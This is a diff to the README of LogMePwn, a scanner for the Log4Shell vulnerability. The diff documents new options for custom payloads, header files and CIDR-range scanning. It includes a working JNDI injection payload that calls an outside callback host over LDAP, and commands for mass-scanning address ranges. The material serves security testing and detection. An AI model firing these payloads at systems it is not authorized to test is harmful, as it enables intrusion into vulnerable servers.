@@ -31,10 +31,14 @@ Usage:
         Specify a file containing list of hosts to scan.
   -headers string
         Comma separated list of HTTP headers to use; if empty a default set of headers are used.
+  -headers-file string
+        Specify a file containing custom set of headers to use in HTTP requests.
   -json
         Use body of type JSON in HTTP requests that can contain a body.
   -methods string
         Comma separated list of HTTP methods to use while scanning. (default "GET")
+  -payload string
+        Specify a single payload or a file containing list of payloads to use.
   -ports string
         Comma separated list of ports to scan per target. (default "80,443,8080")
   -threads int
@@ -50,23 +54,52 @@ Usage:
 
 Examples:
   ./lmp -email alerts@testing.site 1.2.3.4 1.1.1.1:8080
-  ./lmp -token xxxxxxxxxxxxxxxxxx -fbody '<padding_here>%s<padding_here>' -headers 'X-Custom-Header'
+  ./lmp -token xxxxxxxxxxxxxxxxxx -methods POST,PUT -fbody '<padding_here>%s<padding_here>' -headers X-Custom-Header
   ./lmp -webhook https://webhook.testing.site -file internet-ranges.lst -ports 8000,8888
   ./lmp -email alerts@testing.site -methods GET,POST,PUT,PATCH,DELETE 1.2.3.4:8880
 ```
 
 #### Specifying targets
-The targets can be specified in two ways, via the command line interface as arguments, or via a file. Example:
-```groovy
+The targets can be specified in two ways, via the command line interface as arguments, or via a file.
+
+__NEW:__ Now you can even pass CIDR ranges to scan! This feature was introduced in v1.1.
+
+Example:
+```s
 ./lmp <other args here> 1.1.1.1:8080 1.2.3.4:80 1.1.2.2:443
 ./lmp <other args here> -file internet-ranges.lst
+./lmp <other args here> 192.168.0.0/26 1.2.3.4/30
 ```
 The hosts can may contain ports, if not, the set of ports mentioned in `-ports` will be considered for scanning. The default ports list are:
 - 80
 - 443
 - 8080
 
+#### Specifying payloads
+_This feature was introduced in v1.1._
+
+You can specify a payload directly via the `-payload` argument directly. However if you want the DNS name of the host which is being tested in the payload, you can specify a formatting directive `$DNSNAME$` which will be replaced with the target against which the payload is being tested.
+
+e.g. if you supply a command like this:
+```js
+./lmp -payload '${jndi:ldap://$DNSNAME$.xxx.burpcollaborator.net/a}' vulnerable.site.com
+```
+Then when sending a HTTP request to the URL, the payload would look like:
+```sh
+${jndi:ldap://vulnerable-site-com.xxx.burpcollaborator.net/a}
+```
+This feature would help you evaluate which hosts are vulnerable when doing black-box fuzzing.
+
+You can also specify a payload containing multiple variations of the payload using the same argument. (See [`payloads-sample.txt`](payloads-sample.txt)). Example:
+```js
+./lmp -payload payloads-sample.txt vulnerable.site.com
+```
+
+> __NOTE:__ This feature doesn't work with Canary Tokens. Canarytokens doesn't support custom DNS formats.
+
 #### Specifying notification channels
+> __NOTE__: If you're supplying a custom payload using `-payload`, specifying a notification channel is __NOT__ necessary. The payload itself should contain your callback server.
+
 The notification channels can be any of the following:
 - Email (`-email`)
 - Webhook (`-webhook`)
@@ -79,7 +112,11 @@ If you already have a token, you can use the `-token` argument to use the token 
 > __NOTE:__ If you supply either an email or a webhook, the tool will create a custom canary token. If you use a custom callback server, tokens do not come into play.
 
 #### Sending requests
-The tool offers great flexibility when sending requests. By default the tool uses GET requests. A default set of headers are used, each of which contains a payload in its value. You can specify a custom set of headers via the `-headers` argument.
+The tool offers great flexibility when sending requests. By default the tool uses GET requests. A default set of headers are used, each of which contains a payload in its value. You can specify a custom set of headers via the `-headers` argument. You can use the `-headers-file` switch to supply a file containing a list of headers. Examples:
+```groovy
+./lmp <other args> -headers 'X-Api-Version' 1.2.3.4:8080
+./lmp <other args> -headers-file headers.txt 1.2.3.4:8080
+```
 
 You can specify the list of HTTP methods to use for scanning via the `-methods` switch. For requests that contain a body, e.g. `POST`, `PUT`, etc, you can customize content of the bodies.
 
@@ -103,13 +140,13 @@ Since a lot of HTTP requests are involved, it might be a cumbersome job for the 
 
 ## Demo
 To demo the scanner, I make use of a vulnerable setup from [@christophetd](https://twitter.com/christophetd) using docker:
-```groovy
+```js
 docker run -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
 ```
 ![image](https://user-images.githubusercontent.com/39941993/146034544-a0c0e60d-00db-44ae-823a-5e5834888108.png)
 
 Then I run the tool against the setup:
-```groovy
+```js
 ./lmp -email alerts@testing.site 127.0.0.1:8080
 ```
 ![image](https://user-images.githubusercontent.com/39941993/146034732-5600761b-008e-4119-83ce-b5b0f6686b7d.png)
@@ -117,11 +154,15 @@ Then I run the tool against the setup:
 Which immediately triggered a few DNS lookups visible on the token history page as well as my email:
 
 <img src="https://user-images.githubusercontent.com/39941993/146039240-0d34e4d8-284f-4377-bde3-ea13f9f7f5eb.png" width=49% /> <img src="https://user-images.githubusercontent.com/39941993/146039600-ab2a71b1-ec92-4cef-bae4-f3f46dc2ffd6.png" width=49% />
-                                                                                                                                
+
+### New Updates
+- Updates in version v1.1:
+  - Ability to specify custom payloads via file or command line.
+  - Ability to specify custom headers via file.
+  - CIDR range scanning.
+
 ## Ideas & future roadmap
-- [ ] Built-in capability to spin up a custom DNS callback server.
-- [ ] Ability to identify all probable input fields by observing a basic HTTP response.
-- [ ] Obfuscation payload generation.
+Please add your comment to [this issue](https://github.com/0xInfection/LogMePwn/issues/1).
 
 ## License & Version
 The tool is licensed under the GNU GPLv3. LogMePwn is currently at v1.0.
